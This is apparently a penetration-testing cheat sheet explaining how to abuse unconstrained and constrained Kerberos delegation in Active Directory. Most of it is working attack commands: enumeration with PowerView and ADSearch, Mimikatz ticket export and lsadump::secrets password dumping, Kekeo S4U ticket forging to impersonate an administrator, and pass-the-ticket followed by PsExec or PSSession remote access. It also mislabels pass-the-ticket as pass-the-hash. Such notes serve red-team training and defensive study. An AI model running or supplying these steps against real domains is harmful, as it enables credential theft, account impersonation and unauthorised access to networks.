The practical use of Kerberos Delegation is to enable an application to access resources hosted on a different server. An example of this would be a web server that needs to access a SQL database hosted on the database server for the web application that it is hosting.

**types:**

**First: Unconstrained Kerberos Delegation**<br>

When a user authenticates to a computer that has unresitricted kerberos delegation privilege turned on, authenticated user's TGT ticket gets saved to that computer's memory. The reason TGTs get cached in memory is so the computer (with delegation rights) can impersonate the authenticated user as and when required for accessing any other services on that user's behalf.
```
# List unconstrained computers
## Powerview
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
# Export tickets with Mimikatz
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way
```
Then use **Pass the Hash attack** using ```Mimikatz``` to inject it into current our session :
```
mimikatz # kerberos::ptt <TheTicketPass>
mimikatz # exit
Bye!
.\PsExec.exe -accepteula \\machine.domain.local cmd
```

**Second: Constrained Kerberos Delegation** 

Constrained Delegation restricts what services an account can be delegated to, limiting exposure if an account is compromised. Once the client logged in to the delegated service 1, the service 1 ask the KDC to provide S4U2self (simillar to TGT) and S4U2proxy (simillar to TGS) using the TGT of the client. An example of this would be if we were able to compromise an AD account that had constrained delegation configured. By knowing the plaintext password or even just the NTLM hash of this account, we could generate a TGT for this account, then use the TGT to execute a ```S4U``` request for any non-sensitive user account in order to access the service as that user.
 
The following are examples of services that can be configured for delegation:
```
HTTP - Used for web applications to allow pass-through authentication using AD credentials.
WSMAN - It's utilized by PowerShell's remoting feature, allowing administrators to execute commands and scripts on remote computers.
CIFS - Common Internet File System is used for file sharing that allows delegation of users to shares.
LDAP - Used to delegate to the LDAP service for actions such as resetting a user's password.
HOST - Allows delegation of account for all activities on the host.
MSSQL - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.
```
**Constrained Delegation Exploitation**
The first thing we need to do is enumerate available delegations usint ```PowerView``` tool.
```
PS C:\>Import-Module C:\Tools\PowerView.ps1 
PS C:\>Get-NetUser -TrustedToAuth
```
After this recon we should to dump the clear text passwords from registry hive file hopping to find the delegated account password. <br>
We could do this using ```Mimikatz``` tools:
```
# token::elevate    -> is used to impersonate a token with higher privileges
# lsadump::secrets    -> dump clear text passwords
```
Now it's time to use ```Kekeo``` tool to generate our tickets and then use Mimikatz to load those tickets into memory. Let's start by generating the tickets:
```
# tgt::ask /user:<DelegatedAccountUserName> /domain:<DomainName> /password:<DelegatedAccountPassword>
```
This command used to make a TGT associated to the delegated account to make sure this account authenticated in the AD environment.<br>
Now that we have the TGT for the account that can perform delegation, we can forge TGS requests for the account we want to impersonate.
```
# tgs::s4u /tgt:<TheTGTOfTheDelegatedUser> /user:<TheAdministrativeAccountWeWantToImpersonate> /service:<ServiceName>/Machine.Domain.local
```

TheAdministrativeAccountWeWantToImpersonate ->  might be retrived from the enumeration. If we couldn't that we will use the "administrator" if it's enabled.
**Finally:** we use **mimikatz** to pass the ticket and inject it into our current session.
we should make new window of mimikatz to do that.
```
# privilege::debug
# kerberos::ptt <TGTfile> 
```
Now that the tickets are imported, we can finally create our PSSession on the target machine that the delegated account has delegation on.

```
mimikatz # exit
Bye!
PS C:> New-PSSession -ComputerName <TargetMachine.DomainName.local>
PS C:\> Enter-PSSession -ComputerName <TargetMachine.DomainName.local>
```












